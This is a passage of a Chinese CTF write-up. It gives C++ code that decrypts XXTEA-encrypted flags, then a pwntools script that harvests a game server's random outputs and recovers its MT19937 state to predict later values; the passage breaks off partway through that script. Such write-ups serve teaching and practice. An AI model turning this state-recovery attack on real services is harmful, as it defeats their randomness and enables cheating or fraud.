        sum <span class="token operator">+=</span> DELTA<span class="token punctuation">;</span>
        e <span class="token operator">=</span> <span class="token punctuation">(</span>sum <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span>p <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> p <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">;</span> p<span class="token operator">++</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            y <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token punctuation">(</span>p <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            z <span class="token operator">=</span> v<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">+=</span> MX2<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">--</span>rounds<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>在main_RET函数可以看到两组字符串的比对，都是20长度的比对，这两个数据就是加密后的flag了，提取出来分别进行解密即可。</p>
<p><img src="/images/1742736046971-85fbd00a-eb7b-40a2-953a-fa7c9807cbd7.png" loading="lazy"></p>
<p>解密代码：</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DELTA</span> <span class="token expression"><span class="token number">0x9e3779b9</span></span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MX</span> <span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>z <span class="token operator">>></span> <span class="token number">5</span> <span class="token operator">^</span> y <span class="token operator">&lt;&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>y <span class="token operator">>></span> <span class="token number">3</span> <span class="token operator">^</span> z <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>sum <span class="token operator">^</span> y<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token punctuation">(</span>p <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">^</span> e<span class="token punctuation">]</span> <span class="token operator">^</span> z<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MX2</span> <span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>z <span class="token operator">&lt;&lt;</span> <span class="token number">5</span> <span class="token operator">^</span> y <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>y <span class="token operator">&lt;&lt;</span> <span class="token number">3</span> <span class="token operator">^</span> z <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>sum <span class="token operator">^</span> y<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>key2<span class="token punctuation">[</span><span class="token punctuation">(</span>p <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">^</span> e<span class="token punctuation">]</span> <span class="token operator">^</span> z<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span>

<span class="token keyword">uint32_t</span> key<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span> <span class="token number">0x6e637466</span><span class="token punctuation">,</span> <span class="token number">0x62ef0ed</span> <span class="token punctuation">,</span><span class="token number">0xa78c0b4f</span><span class="token punctuation">,</span> <span class="token number">0x32303234</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">uint32_t</span> key2<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span> <span class="token number">0x32303234</span><span class="token punctuation">,</span> <span class="token number">0xd6eb12c3</span><span class="token punctuation">,</span> <span class="token number">0x9f1cf72e</span><span class="token punctuation">,</span> <span class="token number">0x4e435446</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">xxtea_decrypt1</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span> v<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">uint32_t</span> y<span class="token punctuation">,</span> z<span class="token punctuation">,</span> sum<span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> rounds<span class="token punctuation">,</span> e<span class="token punctuation">;</span>
    rounds <span class="token operator">=</span> <span class="token number">16</span><span class="token punctuation">;</span>
    sum <span class="token operator">=</span> DELTA <span class="token operator">*</span> rounds<span class="token punctuation">;</span>
    y <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
    <span class="token keyword">do</span>
    <span class="token punctuation">&#123;</span>
        e <span class="token operator">=</span> <span class="token punctuation">(</span>sum <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> p <span class="token operator">=</span> <span class="token number">5</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> p <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> p<span class="token operator">--</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>p <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
                z <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">else</span>
                z <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

            <span class="token keyword">if</span> <span class="token punctuation">(</span>p <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span>
                y <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">else</span>
                y <span class="token operator">=</span> v<span class="token punctuation">[</span>p <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

            v<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">-=</span> MX<span class="token punctuation">;</span>
            
        <span class="token punctuation">&#125;</span>
        sum <span class="token operator">-=</span> DELTA<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">--</span>rounds<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">xxtea_decrypt2</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span> v<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">uint32_t</span> y<span class="token punctuation">,</span> z<span class="token punctuation">,</span> sum<span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> rounds<span class="token punctuation">,</span> e<span class="token punctuation">;</span>
    rounds <span class="token operator">=</span> <span class="token number">16</span><span class="token punctuation">;</span>
    sum <span class="token operator">=</span> DELTA <span class="token operator">*</span> rounds<span class="token punctuation">;</span>
    y <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">do</span>
    <span class="token punctuation">&#123;</span>
        e <span class="token operator">=</span> <span class="token punctuation">(</span>sum <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> p <span class="token operator">=</span> <span class="token number">5</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> p <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> p<span class="token operator">--</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>p <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
                z <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">else</span>
                z <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

            <span class="token keyword">if</span> <span class="token punctuation">(</span>p <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span>
                y <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">else</span>
                y <span class="token operator">=</span> v<span class="token punctuation">[</span>p <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

            v<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">-=</span> MX2<span class="token punctuation">;</span>

        <span class="token punctuation">&#125;</span>
        sum <span class="token operator">-=</span> DELTA<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">--</span>rounds<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> enc1<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span>
    <span class="token punctuation">&#123;</span>
      <span class="token number">0x5D</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span> <span class="token number">0xD5</span><span class="token punctuation">,</span> <span class="token number">0xB9</span><span class="token punctuation">,</span> <span class="token number">0x8C</span><span class="token punctuation">,</span> <span class="token number">0x95</span><span class="token punctuation">,</span> <span class="token number">0x9C</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0x3B</span><span class="token punctuation">,</span> <span class="token number">0xB1</span><span class="token punctuation">,</span>
      <span class="token number">0x3E</span><span class="token punctuation">,</span> <span class="token number">0x1E</span><span class="token punctuation">,</span> <span class="token number">0x5F</span><span class="token punctuation">,</span> <span class="token number">0xC8</span><span class="token punctuation">,</span> <span class="token number">0xE8</span><span class="token punctuation">,</span> <span class="token number">0xBB</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x69</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> enc2<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span>
    <span class="token punctuation">&#123;</span>
      <span class="token number">0xDE</span><span class="token punctuation">,</span> <span class="token number">0x81</span><span class="token punctuation">,</span> <span class="token number">0xD8</span><span class="token punctuation">,</span> <span class="token number">0xAD</span><span class="token punctuation">,</span> <span class="token number">0xC2</span><span class="token punctuation">,</span> <span class="token number">0xC4</span><span class="token punctuation">,</span> <span class="token number">0xA6</span><span class="token punctuation">,</span> <span class="token number">0x32</span><span class="token punctuation">,</span> <span class="token number">0x1C</span><span class="token punctuation">,</span> <span class="token number">0xAB</span><span class="token punctuation">,</span>
      <span class="token number">0x61</span><span class="token punctuation">,</span> <span class="token number">0x3E</span><span class="token punctuation">,</span> <span class="token number">0xCB</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0xEF</span><span class="token punctuation">,</span> <span class="token number">0xF1</span><span class="token punctuation">,</span> <span class="token number">0x27</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x7A</span><span class="token punctuation">,</span> <span class="token number">0x16</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

    <span class="token function">xxtea_decrypt1</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span>enc1<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">xxtea_decrypt2</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span>enc2<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%.20s%.20s\n"</span><span class="token punctuation">,</span> enc1<span class="token punctuation">,</span>enc2<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>



<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="X1crypsc"><a href="#X1crypsc" class="headerlink" title="X1crypsc"></a><font style="color:#000000;">X1crypsc</font></h3><p>题目使用random库生成随机数，基于mt19937-32算法，选择W可以任意获取随机数数据，构造矩阵即可逆向mt19937的状态，即可预测随机数，攻击成功后进入下面的黑盒阶段。</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> random <span class="token keyword">import</span> Random
<span class="token keyword">import</span> sys
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> random <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> tqdm <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token comment"># ==========================</span>
<span class="token comment">#  Phase 1: 收集PRNG输出数据</span>
<span class="token comment"># ==========================</span>
<span class="token keyword">def</span> <span class="token function">collect_bits</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Collecting 624*32 bits for MT19937 state..."</span><span class="token punctuation">)</span>
    
    bits_collected <span class="token operator">=</span> <span class="token number">0</span>
    D<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">while</span> bits_collected <span class="token operator">&lt;</span> <span class="token number">625</span> <span class="token operator">*</span> <span class="token number">32</span><span class="token punctuation">:</span>  
        p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'option:'</span><span class="token punctuation">,</span> <span class="token string">b'W'</span><span class="token punctuation">)</span>  <span class="token comment"># 选择武器刷新</span>
        p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'Current attack value: '</span><span class="token punctuation">)</span>
        line <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
        low<span class="token punctuation">,</span> high <span class="token operator">=</span> <span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">,</span> line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' ~ '</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        base <span class="token operator">=</span> low
        add <span class="token operator">=</span> high <span class="token operator">-</span> base 
        
        val1 <span class="token operator">=</span> base
        val2 <span class="token operator">=</span> add

        D<span class="token punctuation">.</span>append<span class="token punctuation">(</span>val1<span class="token punctuation">)</span>
        D<span class="token punctuation">.</span>append<span class="token punctuation">(</span>val2<span class="token punctuation">)</span>
        p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'y'</span><span class="token punctuation">)</span>
        bits_collected <span class="token operator">+=</span> <span class="token number">32</span>
        
        sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"\rBits collected: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>bits_collected<span class="token punctuation">&#125;</span></span><span class="token string">/20000"</span></span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>
        
        <span class="token comment"># 发送'n'不继续刷新</span>
        p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'?'</span><span class="token punctuation">,</span> <span class="token string">b'n'</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>D<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> D

<span class="token comment"># ==========================</span>
<span class="token comment">#  Phase 2: 预测坐标并攻击</span>
<span class="token comment"># ==========================</span>
<span class="token keyword">def</span> <span class="token function">attack_monster</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> predictor<span class="token punctuation">,</span>D<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+]'</span><span class="token punctuation">)</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        <span class="token comment"># 预测下一个randrange(2025) x和y</span>
        x <span class="token operator">=</span> predictor<span class="token punctuation">.</span>randrange<span class="token punctuation">(</span><span class="token number">2025</span><span class="token punctuation">)</span>
        y <span class="token operator">=</span> predictor<span class="token punctuation">.</span>randrange<span class="token punctuation">(</span><span class="token number">2025</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>
        <span class="token comment"># 发送攻击指令</span>
        p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'option:'</span><span class="token punctuation">)</span>
        p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'A'</span><span class="token punctuation">)</span>
        p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'aim:'</span><span class="token punctuation">)</span>
        p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>x<span class="token punctuation">&#125;</span></span><span class="token string"> </span><span class="token interpolation"><span class="token punctuation">&#123;</span>y<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        
        resp <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
        
        a<span class="token operator">=</span>predictor<span class="token punctuation">.</span>randint<span class="token punctuation">(</span>D<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>D<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">b'Victory'</span> <span class="token keyword">in</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'-------------------------------------------------'</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span>
    

<span class="token comment">#--------------------------------------------------------------</span>

context<span class="token punctuation">(</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span><span class="token punctuation">)</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'39.106.16.204'</span><span class="token punctuation">,</span> <span class="token number">11448</span><span class="token punctuation">)</span> 

Dall <span class="token operator">=</span> collect_bits<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>Dall<span class="token punctuation">)</span>

n<span class="token operator">=</span><span class="token number">1250</span>
D<span class="token operator">=</span>Dall<span class="token punctuation">[</span><span class="token punctuation">:</span>n<span class="token punctuation">]</span>
rng<span class="token operator">=</span>Random<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">getRows</span><span class="token punctuation">(</span>rng<span class="token punctuation">)</span><span class="token punctuation">:</span>
    row<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
        row<span class="token operator">+=</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">bin</span><span class="token punctuation">(</span>rng<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> row
M<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">19968</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    state <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">624</span>
    temp <span class="token operator">=</span> <span class="token string">"0"</span><span class="token operator">*</span>i <span class="token operator">+</span> <span class="token string">"1"</span><span class="token operator">*</span><span class="token number">1</span> <span class="token operator">+</span> <span class="token string">"0"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">19968</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>i<span class="token punctuation">)</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">624</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        state<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>temp<span class="token punctuation">[</span><span class="token number">32</span><span class="token operator">*</span>j<span class="token punctuation">:</span><span class="token number">32</span><span class="token operator">*</span>j<span class="token operator">+</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>
    rng<span class="token punctuation">.</span>setstate<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token builtin">tuple</span><span class="token punctuation">(</span>state<span class="token operator">+</span><span class="token punctuation">[</span><span class="token number">624</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
    M<span class="token punctuation">.</span>append<span class="token punctuation">(</span>getRows<span class="token punctuation">(</span>rng<span class="token punctuation">)</span><span class="token punctuation">)</span>
    
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'--------------------------------------------------'</span><span class="token punctuation">)</span>
M<span class="token operator">=</span>Matrix<span class="token punctuation">(</span>GF<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>M<span class="token punctuation">)</span>
y<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    y<span class="token operator">+=</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">bin</span><span class="token punctuation">(</span>D<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
y<span class="token operator">=</span>vector<span class="token punctuation">(</span>GF<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>y<span class="token punctuation">)</span>
s<span class="token operator">=</span>M<span class="token punctuation">.</span>solve_left<span class="token punctuation">(</span>y<span class="token punctuation">)</span>
G<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">624</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    C<span class="token operator">=</span><span class="token number">0</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        C<span class="token operator">&lt;&lt;</span><span class="token operator">=</span><span class="token number">1</span>
        C<span class="token operator">|</span><span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token number">32</span><span class="token operator">*</span>i<span class="token operator">+</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>
    G<span class="token punctuation">.</span>append<span class="token punctuation">(</span>C<span class="token punctuation">)</span>
<span class="token keyword">import</span> random
RNG1 <span class="token operator">=</span> random<span class="token punctuation">.</span>Random<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">624</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    G<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>G<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
RNG1<span class="token punctuation">.</span>setstate<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">tuple</span><span class="token punctuation">(</span>G<span class="token operator">+</span><span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">624</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment">#------------------------------------------------------------</span>
<span class="token comment">#控制到当前状态</span>
RNG1<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span>
ss<span class="token operator">=</span><span class="token number">0</span>
d1<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">while</span> ss <span class="token operator">&lt;</span> <span class="token number">625</span> <span class="token operator">*</span> <span class="token number">32</span><span class="token punctuation">:</span>
    d1<span class="token punctuation">.</span>append<span class="token punctuation">(</span>RNG1<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    d1<span class="token punctuation">.</span>append<span class="token punctuation">(</span>RNG1<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    ss <span class="token operator">+=</span> <span class="token number">32</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>d1<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>


